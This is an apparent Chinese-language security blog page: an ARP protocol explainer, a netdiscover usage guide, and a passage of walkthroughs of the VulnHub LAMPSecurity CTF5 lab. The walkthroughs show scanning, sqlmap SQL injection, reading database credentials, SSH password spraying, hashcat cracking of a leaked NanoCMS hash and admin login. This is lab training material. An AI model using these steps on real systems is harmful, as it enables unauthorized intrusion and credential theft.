<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>thedarknessdied</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="记录美好的生活">
<meta property="og:type" content="website">
<meta property="og:title" content="thedarknessdied">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="thedarknessdied">
<meta property="og:description" content="记录美好的生活">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="R0seK1llere">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="thedarknessdied" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 7.1.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">thedarknessdied</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">R0seK1ller</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-protocol-arp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/03/15/protocol-arp/" class="article-date">
  <time class="dt-published" datetime="2024-03-15T05:49:01.000Z" itemprop="datePublished">2024-03-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/03/15/protocol-arp/">protocol-arp</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h1><h2 id="0-ARP-协议基本概念"><a href="#0-ARP-协议基本概念" class="headerlink" title="0. ARP 协议基本概念"></a>0. ARP 协议基本概念</h2><p>​	地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP&#x2F;IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。</p>
<h2 id="1-ARP-数据包格式解析"><a href="#1-ARP-数据包格式解析" class="headerlink" title="1. ARP 数据包格式解析"></a>1. ARP 数据包格式解析</h2><h3 id="1-1-以太网帧封装的ARP数据包"><a href="#1-1-以太网帧封装的ARP数据包" class="headerlink" title="1.1 以太网帧封装的ARP数据包"></a>1.1 以太网帧封装的ARP数据包</h3><p><img src="/images/image-20240315124206322.png" alt="image-20240315124206322"></p>
<p>​	ARP是个独立的三层协议，并不需要IP协议封装，而是直接生成自己的报文，到达数据链路层后，由数据链路层协议进行封装，一般是以太网协议。封装的过程，就是在ARP报文的前面加上以太网帧头，再加上4字节的冗余校验码结尾，校验码用于检验数据传输是否出现损坏。</p>
<blockquote>
<p>主要参数 :</p>
<p>​	以太网目的地址：6字节，如果是ARP请求报文，该字段为广播MAC地址(FF:FF:FF:FF:FF:FF)</p>
<p>​	以太网源地址：6字节</p>
<p>​	帧类型：2字节，0x0806表示是ARP协议</p>
<p>​	以太网帧尾： 4字节</p>
</blockquote>
<p><strong>注：以太网帧最小长度是64个字节，最长1518个字节。封装后的ARP帧，实际就是一个最小以太网帧，包含14个字节的以太网帧头，28个字节的ARP报文，4个字节的以太网帧尾，一共是46个字节，其余18个字节用0来填充，共计64个字节。</strong></p>
<h3 id="1-2-ARP-数据包报文"><a href="#1-2-ARP-数据包报文" class="headerlink" title="1.2 ARP 数据包报文"></a>1.2 ARP 数据包报文</h3><p><img src="/images/image-20240315122951442.png" alt="image-20240315122951442"></p>
<blockquote>
<p>主要参数 :</p>
<p>​	硬件类型：2字节，值为1表示以太网地址</p>
<p>​	协议类型：2字节，0x0800表示IP地址</p>
<p>​	硬件地址长度：1字节，数值为6</p>
<p>​	协议地址长度：1字节，数值为4</p>
<p>​	操作代码：2字节，1表示请求报文，2表示应答报文</p>
<p>​	源MAC地址：6字节</p>
<p>​	源IP地址：4节字</p>
<p>​	目的MAC地址：6字节	</p>
<p>·	目的IP地址：4节字</p>
</blockquote>
<h2 id="2-ARP-协议工作流程"><a href="#2-ARP-协议工作流程" class="headerlink" title="2. ARP 协议工作流程"></a>2. ARP 协议工作流程</h2><h3 id="2-1-ARP-协议工作流程原理简述"><a href="#2-1-ARP-协议工作流程原理简述" class="headerlink" title="2.1 ARP 协议工作流程原理简述"></a>2.1 ARP 协议工作流程原理简述</h3><p>​	(以下图主机A与主机C之间进行通信为例)</p>
<p><img src="/images/image-20240315125654168.png" alt="image-20240315125654168"></p>
<pre><code> 1. 主机A想要发送数据包到主机C，首先会检查**本地ARP缓存**，即ARP缓存表，搜索目标IP地址是否存在对应的MAC地址
 2. 如果ARP表中目标IP地址已有对应的MAC地址，则直接使用该地址进行数据包发送
 3. 如果ARP表中不存在目标IP地址对应的MAC地址，则向**本地网络中广播ARP请求**（ARP Request）数据包，请求其它主机回复该IP地址所对应的MAC地址
 4. 凡是收到ARP请求数据包的主机，都比较其自身拥有的IP地址和ARP请求数据包中的目标IP地址是否匹配。若匹配，则向主机A发送ARP响应（ARP Reply）数据包，其中包含其自己的MAC地址
 5. 主机A收到ARP响应数据包后，即可根据目标IP地址和对应的MAC地址进行数据包的发送
</code></pre>
<h3 id="2-2-ARP-协议工作流程实验简述"><a href="#2-2-ARP-协议工作流程实验简述" class="headerlink" title="2.2 ARP 协议工作流程实验简述"></a>2.2 ARP 协议工作流程实验简述</h3><h4 id="2-2-1-主机A在本地ARP缓存表中查找对应的MAC地址"><a href="#2-2-1-主机A在本地ARP缓存表中查找对应的MAC地址" class="headerlink" title="2.2.1 主机A在本地ARP缓存表中查找对应的MAC地址"></a>2.2.1 主机A在本地ARP缓存表中查找对应的MAC地址</h4><p><img src="/images/image-20240315125853205.png" alt="image-20240315125853205"></p>
<h4 id="2-2-2-发送请求包"><a href="#2-2-2-发送请求包" class="headerlink" title="2.2.2 发送请求包"></a>2.2.2 发送请求包</h4><p>​	主机A在ARP表中找不到对应的MAC地址，则将缓存该数据报文，然后以广播方式发送一个ARP请求报文</p>
<p><img src="/images/image-20240315130345973.png" alt="image-20240315130345973"></p>
<table>
<thead>
<tr>
<th>目的IP</th>
<th>源IP</th>
<th>目的MAC</th>
<th>源MAC</th>
<th>类型</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.0.3</td>
<td>192.168.0.1</td>
<td>FF-FF-FF-FF-FF-FF</td>
<td>54-89-98-80-72-D7</td>
<td>Request</td>
</tr>
</tbody></table>
<h4 id=""><a href="#" class="headerlink" title=""></a><img src="/images/image-20240315130905425.png" alt="image-20240315130905425"></h4><h4 id="2-2-3-接受响应包"><a href="#2-2-3-接受响应包" class="headerlink" title="2.2.3 接受响应包"></a>2.2.3 接受响应包</h4><p>​	由于ARP请求报文以广播方式发送，该网段上的所有主机都可以接收到该请求，但只有被请求的主机（即主机C）会对该请求进行处理</p>
<p>​	主机C比较自己的IP地址和ARP请求报文中的目标IP地址，当两者相同时进行如下处理：将ARP请求报文中的发送端（即主机A）的IP地址和MAC地址存入自己的ARP表中。之后以单播方式发送ARP响应报文给主机A，其中包含了自己的MAC地址。</p>
<p><img src="/images/image-20240315130436795.png" alt="image-20240315130436795"></p>
<table>
<thead>
<tr>
<th>目的IP</th>
<th>源IP</th>
<th>目的MAC</th>
<th>源MAC</th>
<th>类型</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.0.1</td>
<td>192.168.0.3</td>
<td>54-89-98-80-72-D7</td>
<td>54-89-98-B7-0B-E8</td>
<td>Reply</td>
</tr>
</tbody></table>
<p><img src="/images/image-20240315130929464.png" alt="image-20240315130929464"></p>
<h4 id="2-2-4-ARP-缓存"><a href="#2-2-4-ARP-缓存" class="headerlink" title="2.2.4 ARP 缓存"></a>2.2.4 ARP 缓存</h4><p>​	为了避免重复发送ARP请求，产生大量的广播包，每台主机都有一个ARP缓存列表，当源主机得到 ARP 响应后，将目标主机的 IP 地址和物理地址存入本机 ARP 缓存中，并保留一定时间。下次请求 MAC 地址时，直接查询 ARP 缓存，而无须再发送 ARP 请求，从而节约了网络资源。当缓存生存期结束后，才会再次发送ARP请求报文。</p>
<h2 id="3-ARP-的应用场景"><a href="#3-ARP-的应用场景" class="headerlink" title="3. ARP 的应用场景"></a>3. ARP 的应用场景</h2><ul>
<li>ARP的主要应用在局域网中，用于寻找目标主机的MAC地址，以实现数据包的发送和接收</li>
<li>ARP是广泛应用在TCP&#x2F;IP协议栈中的重要协议，为网络通信提供了必要的支持</li>
<li>ARP还可以用于攻击，ARP欺骗可以伪装成另一个主机的MAC地址，欺骗路由器或其它主机发送信息</li>
</ul>
<h2 id="4-ARP-的优缺点"><a href="#4-ARP-的优缺点" class="headerlink" title="4.  ARP 的优缺点"></a>4.  ARP 的优缺点</h2><ul>
<li>ARP能在目标MAC地址未知的情况下实现数据包的发送和接收，使通信更加方便</li>
<li>ARP对网络协议和硬件无特殊要求，适用范围广泛</li>
<li>ARP有可能存在缓存污染攻击等安全风险，需要加强安全防护</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/03/15/protocol-arp/" data-id="clts8ref5000126vdav6m7nq5" data-title="protocol-arp" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/protocol/" rel="tag">protocol</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-tools-netdiscover" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/03/15/tools-netdiscover/" class="article-date">
  <time class="dt-published" datetime="2024-03-15T02:38:07.000Z" itemprop="datePublished">2024-03-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/03/15/tools-netdiscover/">tools-netdiscover</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="工具–Netdiscover"><a href="#工具–Netdiscover" class="headerlink" title="工具–Netdiscover"></a>工具–Netdiscover</h1><h2 id="0-Netdiscover-基本概念"><a href="#0-Netdiscover-基本概念" class="headerlink" title="0. Netdiscover 基本概念"></a>0. Netdiscover 基本概念</h2><p>​	ARP 侦查工具 Netdiscover Netdiscover 是一个主动 &#x2F; 被动的 ARP 侦查工具。该工具在不使用 DHCP 的无线网络上非常有用。使用 Netdiscover 工具可以在网络上扫描 IP 地址， ARP 侦查工具 Netdiscover 检查在线主机或搜索为它们发送的 ARP 请求</p>
<h2 id="1-Netdiscover-常见参数解析"><a href="#1-Netdiscover-常见参数解析" class="headerlink" title="1. Netdiscover 常见参数解析"></a>1. Netdiscover 常见参数解析</h2><table>
<thead>
<tr>
<th>参数</th>
<th>简介</th>
</tr>
</thead>
<tbody><tr>
<td>-i device</td>
<td>网络设备，网卡的设置</td>
</tr>
<tr>
<td>-r range</td>
<td>扫描给定的IP地址范围(可以通过CIDR表示)</td>
</tr>
<tr>
<td>-l file</td>
<td>扫描包含在文件中的IP地址范围</td>
</tr>
<tr>
<td>-p passive</td>
<td>(被动扫描)不发送任何内容，只发送嗅探针</td>
</tr>
<tr>
<td>-m file</td>
<td>扫描已知MAC地址和主机名的列表</td>
</tr>
<tr>
<td>-F filter</td>
<td>自定义pcap filter表达式(默认是’arp‘)</td>
</tr>
<tr>
<td>-s time</td>
<td>每个ARP请求之间的休眠时间(ms)</td>
</tr>
<tr>
<td>-c count</td>
<td>发送每个ARP请求的次数(对于丢失数据包的网络而言)</td>
</tr>
<tr>
<td>-n node</td>
<td>用于扫描的最后一个源IP八位字节(2-253)</td>
</tr>
<tr>
<td>-d</td>
<td>忽略自动扫描和快速模式的主配置文件</td>
</tr>
<tr>
<td>-f</td>
<td>启动快速模式扫描，节省大量时间，建议使用auto</td>
</tr>
<tr>
<td>-P</td>
<td>打印结果的格式适用于另一个程序的解析，并在活动扫描后停止</td>
</tr>
<tr>
<td>-L</td>
<td>类似于-P，但在活动扫描完成后继续监听</td>
</tr>
<tr>
<td>-N</td>
<td>不打印页眉，仅当启用-P或者-L时有效</td>
</tr>
<tr>
<td>-S</td>
<td>启用每个请求之间的休眠时间抑制(硬核模式)，扫描速度很快</td>
</tr>
</tbody></table>
<h2 id="2-Netdiscover-使用"><a href="#2-Netdiscover-使用" class="headerlink" title="2. Netdiscover 使用"></a>2. Netdiscover 使用</h2><h3 id="2-1-主动发现"><a href="#2-1-主动发现" class="headerlink" title="2.1 主动发现"></a>2.1 主动发现</h3><p>​	遵循 ARP 协议</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r CIDR</span><br></pre></td></tr></table></figure>

<blockquote>
<p>netdiscover -r 192.168.70.0&#x2F;24</p>
</blockquote>
<p><img src="/images/image-20240315101411455.png" alt="image-20240315101411455"></p>
<h3 id="2-2-被动发现"><a href="#2-2-被动发现" class="headerlink" title="2.2 被动发现"></a>2.2 被动发现</h3><p>​	遵循 SSDP协议</p>
<blockquote>
<p>netdiscover -p</p>
</blockquote>
<p><img src="/images/image-20240315103449746.png" alt="image-20240315103449746"></p>
<h3 id="2-3-扫描后停止扫描"><a href="#2-3-扫描后停止扫描" class="headerlink" title="2.3 扫描后停止扫描"></a>2.3 扫描后停止扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r CIDR -P</span><br></pre></td></tr></table></figure>

<blockquote>
<p>netdiscover -r 192.168.70.0&#x2F;24 -P</p>
</blockquote>
<p><img src="/images/image-20240315101932699.png" alt="image-20240315101932699"></p>
<h3 id="2-4-扫描后继续监听"><a href="#2-4-扫描后继续监听" class="headerlink" title="2.4 扫描后继续监听"></a>2.4 扫描后继续监听</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r CIDR -L</span><br></pre></td></tr></table></figure>

<blockquote>
<p>netdiscover -r 192.168.70.0&#x2F;24 -L</p>
</blockquote>
<p><img src="/images/image-20240315102223897.png" alt="image-20240315102223897"></p>
<h3 id="2-5-结果无页眉修饰"><a href="#2-5-结果无页眉修饰" class="headerlink" title="2.5 结果无页眉修饰"></a>2.5 结果无页眉修饰</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r CIDR -N</span><br></pre></td></tr></table></figure>

<blockquote>
<p>netdiscover -r 192.168.70.0&#x2F;24 -P -N</p>
</blockquote>
<p><img src="/images/image-20240315102529860.png" alt="image-20240315102529860"></p>
<h3 id="2-6-重复发送请求"><a href="#2-6-重复发送请求" class="headerlink" title="2.6 重复发送请求"></a>2.6 重复发送请求</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r CIDR -c [numbers]</span><br></pre></td></tr></table></figure>

<blockquote>
<p>netdiscover -r 192.168.70.0&#x2F;24 -c 5</p>
</blockquote>
<p>​	对于每个扫描目标发送numbers次ARP请求</p>
<p><img src="/images/image-20240315102902227.png" alt="image-20240315102902227"></p>
<blockquote>
</blockquote>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/03/15/tools-netdiscover/" data-id="clts8refa000326vdf7t26kub" data-title="tools-netdiscover" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/scanner/" rel="tag">scanner</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-vulnhub-LAMPSecurity-CTF5-external" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/03/14/vulnhub-LAMPSecurity-CTF5-external/" class="article-date">
  <time class="dt-published" datetime="2024-03-14T15:03:51.000Z" itemprop="datePublished">2024-03-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/03/14/vulnhub-LAMPSecurity-CTF5-external/">vulnhub-LAMPSecurity-CTF5-external</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>[toc]</p>
<h1 id="CTF5靶机探索"><a href="#CTF5靶机探索" class="headerlink" title="CTF5靶机探索"></a>CTF5靶机探索</h1><h2 id="1-Email用户注册处存在SQL注入"><a href="#1-Email用户注册处存在SQL注入" class="headerlink" title="1. Email用户注册处存在SQL注入"></a>1. Email用户注册处存在SQL注入</h2><p>​	访问<code>http://192.168.134.152/list/</code>可以看到这是一个Phake Organization的注册界面，BurpSuite抓包发现在当前注册功能点处用明文传输，且测试后发现存在SQL注入，以下是采用sqlmap来进行验证：</p>
<p><img src="/images/image-20230322102625939.png" alt="image-20230322102625939"></p>
<p><img src="/images/image-20230322102759639.png" alt="image-20230322102759639"></p>
<h2 id="2-远程数据库链接"><a href="#2-远程数据库链接" class="headerlink" title="2. 远程数据库链接"></a>2. 远程数据库链接</h2><h3 id="2-1-通过读取配置文件获取数据库配置信息"><a href="#2-1-通过读取配置文件获取数据库配置信息" class="headerlink" title="2.1 通过读取配置文件获取数据库配置信息"></a>2.1 通过读取配置文件获取数据库配置信息</h3><p>​		默认情况下，Linux环境下站点都是搭建在<code>/var/www/html</code>文件路径下的，一般默认情况下数据库等文件的配置路径也是会存放在这个路径下，依次访问该路径下的不同文件，可以发现在<code>/var/www/html/list</code>路径下的index.php中存放了数据库的连接账号密码</p>
<p><img src="/images/image-20230322100010898.png" alt="image-20230322100010898"></p>
<p>​		上是对数据库进行远程登录</p>
<blockquote>
<p>mysql -h 192.168.134.152 -u root -p</p>
<p>输入数据库的账号、密码</p>
</blockquote>
<p><img src="/images/image-20230322100446473.png" alt="image-20230322100446473"></p>
<blockquote>
<p>在 drupal 数据库users表中获取到用户信息</p>
</blockquote>
<p>​		将密码进行md5解密，并使用crackmapexec进行SSH链接密码喷射，但是都链接失败</p>
<p><img src="/images/image-20230322100618078.png" alt="image-20230322100618078"></p>
<h3 id="2-2-通过sql注入获取登录信息"><a href="#2-2-通过sql注入获取登录信息" class="headerlink" title="2.2 通过sql注入获取登录信息"></a>2.2 通过sql注入获取登录信息</h3><blockquote>
<p>sqlmap -r register.txt –banner –password</p>
</blockquote>
<p><img src="/images/image-20240314161227649.png" alt="image-20240314161227649"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/03/14/vulnhub-LAMPSecurity-CTF5-external/" data-id="clts8refg000626vd35r715fu" data-title="vulnhub-LAMPSecurity-CTF5-external" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vulnhub/" rel="tag">vulnhub</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-vulnhub-LAMPSecurity-CTF5-md" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/03/14/vulnhub-LAMPSecurity-CTF5-md/" class="article-date">
  <time class="dt-published" datetime="2024-03-14T11:03:36.000Z" itemprop="datePublished">2024-03-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/03/14/vulnhub-LAMPSecurity-CTF5-md/">vulnhub-LAMPSecurity-CTF5.md</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>[toc]</p>
<h1 id="CTF5-靶场"><a href="#CTF5-靶场" class="headerlink" title="CTF5 靶场"></a>CTF5 靶场</h1><h2 id="0-环境配置"><a href="#0-环境配置" class="headerlink" title="0. 环境配置"></a>0. 环境配置</h2><table>
<thead>
<tr>
<th>主机</th>
<th>IP</th>
</tr>
</thead>
<tbody><tr>
<td>攻击机</td>
<td>192.168.134.1</td>
</tr>
<tr>
<td>靶机</td>
<td>192.168.134.152</td>
</tr>
</tbody></table>
<h2 id="1-netdiscover-同段主机存活主机探测"><a href="#1-netdiscover-同段主机存活主机探测" class="headerlink" title="1. netdiscover 同段主机存活主机探测"></a>1. netdiscover 同段主机存活主机探测</h2><blockquote>
<p>sudo netdiscover -i eth0 -r 192.168.134.0&#x2F;24</p>
</blockquote>
<p><img src="/images/image-20230317162053217.png" alt="image-20230317162053217"></p>
<h2 id="2-Nmap主机开放服务探测"><a href="#2-Nmap主机开放服务探测" class="headerlink" title="2. Nmap主机开放服务探测"></a>2. Nmap主机开放服务探测</h2><h3 id="2-1-mini-rate-快速探测主机开放服务"><a href="#2-1-mini-rate-快速探测主机开放服务" class="headerlink" title="2.1  mini-rate 快速探测主机开放服务"></a>2.1  mini-rate 快速探测主机开放服务</h3><blockquote>
<p>sudo nmap –min-rate 10000 -p- -Pn 192.168.134.152</p>
</blockquote>
<p><img src="/images/image-20230317162537416.png" alt="image-20230317162537416"></p>
<p>​	可以看出当前靶场开放较多端口，这里的话重点关注22、80、3306</p>
<h3 id="2-2-TCP服务开放性探测"><a href="#2-2-TCP服务开放性探测" class="headerlink" title="2.2 TCP服务开放性探测"></a>2.2 TCP服务开放性探测</h3><blockquote>
<p>sudo nmap -sT -sV -sC -A -O -p- 192.168.134.152</p>
</blockquote>
<p><img src="/images/image-20230317162830184.png" alt="image-20230317162830184"></p>
<h3 id="2-3-UDP服务开放性探测"><a href="#2-3-UDP服务开放性探测" class="headerlink" title="2.3 UDP服务开放性探测"></a>2.3 UDP服务开放性探测</h3><blockquote>
<p>sudo nmap –min-rate 10000 -p- sU -v 192.168.134.152</p>
</blockquote>
<p><img src="/images/image-20230317162506365.png" alt="image-20230317162506365"></p>
<h3 id="2-4-服务端vuln脚本探测"><a href="#2-4-服务端vuln脚本探测" class="headerlink" title="2.4 服务端vuln脚本探测"></a>2.4 服务端vuln脚本探测</h3><blockquote>
<p>sudo nmap –script&#x3D;vuln -p 22,25,80,110,111,139,143,445,901,3306,50156 192.168.134.152</p>
</blockquote>
<p><img src="/images/image-20230317163344786.png" alt="image-20230317163344786"></p>
<p>​	发现存在phpmyadmin目录，也发现了其他几个可能存在敏感信息泄漏的文件，例如info.php</p>
<h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3. 渗透测试"></a>3. 渗透测试</h2><h3 id="3-1-根据Nmap扫描结果，对80端口web服务进行测试"><a href="#3-1-根据Nmap扫描结果，对80端口web服务进行测试" class="headerlink" title="3.1.  根据Nmap扫描结果，对80端口web服务进行测试"></a>3.1.  根据Nmap扫描结果，对80端口web服务进行测试</h3><h4 id="3-1-1-访问-http-192-168-70-193-info-php"><a href="#3-1-1-访问-http-192-168-70-193-info-php" class="headerlink" title="3.1.1 访问 http://192.168.70.193/info.php:"></a>3.1.1 访问 <a target="_blank" rel="noopener" href="http://192.168.70.193/info.php">http://192.168.70.193/info.php</a>:</h4><p><img src="/images/image-20240314182459680.png" alt="image-20240314182459680"></p>
<h4 id="3-1-2-访问-http-192-168-70-193-phpmyadmin"><a href="#3-1-2-访问-http-192-168-70-193-phpmyadmin" class="headerlink" title="3.1.2 访问 http://192.168.70.193/phpmyadmin:"></a>3.1.2 访问 <a target="_blank" rel="noopener" href="http://192.168.70.193/phpmyadmin">http://192.168.70.193/phpmyadmin</a>:</h4><p><img src="/images/image-20240314182522165.png" alt="image-20240314182522165"></p>
<h4 id="3-1-3-访问-http-192-168-70-193-inc-php"><a href="#3-1-3-访问-http-192-168-70-193-inc-php" class="headerlink" title="3.1.3 访问 http://192.168.70.193/inc.php:"></a>3.1.3 访问 <a target="_blank" rel="noopener" href="http://192.168.70.193/inc.php">http://192.168.70.193/inc.php</a>:</h4><p><img src="/images/image-20240314182622132.png" alt="image-20240314182622132"></p>
<h4 id="3-1-4-访问-http-192-168-70-193-andy-index-php"><a href="#3-1-4-访问-http-192-168-70-193-andy-index-php" class="headerlink" title="3.1.4 访问 http://192.168.70.193/~andy/index.php:"></a>3.1.4 访问 <a target="_blank" rel="noopener" href="http://192.168.70.193/~andy/index.php">http://192.168.70.193/~andy/index.php</a>:</h4><blockquote>
<p>可以发现当点击Navigation时，不同的页面调整是通过page参数控制的:</p>
<p><a target="_blank" rel="noopener" href="http://192.168.134.152/~andy/index.php?page=home">http://192.168.134.152/~andy/index.php?page=home</a></p>
</blockquote>
<p><img src="/images/image-20230322091931405.png" alt="image-20230322091931405"></p>
<h3 id="3-2-NanoCMS-HASH泄露"><a href="#3-2-NanoCMS-HASH泄露" class="headerlink" title="3.2 NanoCMS HASH泄露"></a>3.2 NanoCMS HASH泄露</h3><h4 id="3-2-1-CMS-框架识别"><a href="#3-2-1-CMS-框架识别" class="headerlink" title="3.2.1 CMS 框架识别"></a>3.2.1 CMS 框架识别</h4><p>​	在<a target="_blank" rel="noopener" href="http://192.168.70.193/~andy/index.php%E9%A1%B5%E9%9D%A2%E4%B8%ADF12%E6%89%93%E5%BC%80%E6%8E%A7%E5%88%B6%E5%8F%B0%EF%BC%8C%E5%9C%A8/">http://192.168.70.193/~andy/index.php页面中F12打开控制台，在\</a>&lt;meta&gt;标签中泄露了当前页面所使用的是 NanoCMS</p>
<p><img src="/images/image-20240314154429622.png" alt="image-20240314154429622"></p>
<h4 id="3-2-2-NanoCMS-历史漏洞"><a href="#3-2-2-NanoCMS-历史漏洞" class="headerlink" title="3.2.2 NanoCMS 历史漏洞"></a>3.2.2 NanoCMS 历史漏洞</h4><p>​	在一些公开的漏洞库中可以查询到NanoCMS在低版本中存在漏洞，我们可以通过<code>NanoCMS密码hash泄露</code>获取到我们想要的管理员信息，访问<code>http://192.168.134.152/~andy/data/pagesdata.txt</code>，对password字段进行md5解密获取到以下信息:</p>
<p><img src="/images/image-20230322092821310.png" alt="image-20230322092821310"></p>
<p>​	对获取到的password的hash值进行判断，使用的加密方式</p>
<blockquote>
<p>hash-identifier 判断获取的hash散列值可能的加密方式</p>
</blockquote>
<p><img src="/images/image-20240314154715200.png" alt="image-20240314154715200"></p>
<p>​	对散列值进行暴力破解</p>
<blockquote>
<p>hashcat -a 0 -m 0 9d2f75377ac0ab991d40c91fd27e52fd &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt </p>
</blockquote>
<p><img src="/images/image-20240314155417087.png" alt="image-20240314155417087"></p>
<p>​	获取到登录接口的一个账号密码</p>
<blockquote>
<p>username: admin</p>
<p>password: shannon</p>
</blockquote>
<h3 id="3-3-前端后台获取shell"><a href="#3-3-前端后台获取shell" class="headerlink" title="3.3 前端后台获取shell"></a>3.3 前端后台获取shell</h3><h4 id="3-3-1-登录前端后台"><a href="#3-3-1-登录前端后台" class="headerlink" title="3.3.1 登录前端后台"></a>3.3.1 登录前端后台</h4><p>​	访问 <a target="_blank" rel="noopener" href="http://192.168.70.193/~andy/index.php?page=home%EF%BC%8C%E8%A7%82%E5%AF%9F%E5%88%B0%E5%BD%93%E5%89%8D%E9%A1%B5%E9%9D%A2%E5%AD%98%E5%9C%A8Login%E6%8E%A5%E5%8F%A3">http://192.168.70.193/~andy/index.php?page=home，观察到当前页面存在Login接口</a></p>
<p><img src="/images/image-20240314155208870.png" alt="image-20240314155208870"></p>
<p>​		点击‘Admin Login’，跳转到<a target="_blank" rel="noopener" href="http://192.168.70.193/~andy/data/nanoadmin.php%EF%BC%8C%E4%BD%BF%E7%94%A8%E4%B8%8A%E9%9D%A2%E6%B3%84%E9%9C%B2%E5%87%BA%E6%9D%A5%E7%9A%84%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E8%BF%9B%E8%A1%8C%E7%99%BB%E5%BD%95">http://192.168.70.193/~andy/data/nanoadmin.php，使用上面泄露出来的账号密码进行登录</a></p>
<p><img src="/images/image-20240314155316769.png" alt="image-20240314155316769"></p>
<p>​		对Admin界面的功能点进行一波测试</p>
<p><img src="/images/image-20230322093129087.png" alt="image-20230322093129087"></p>
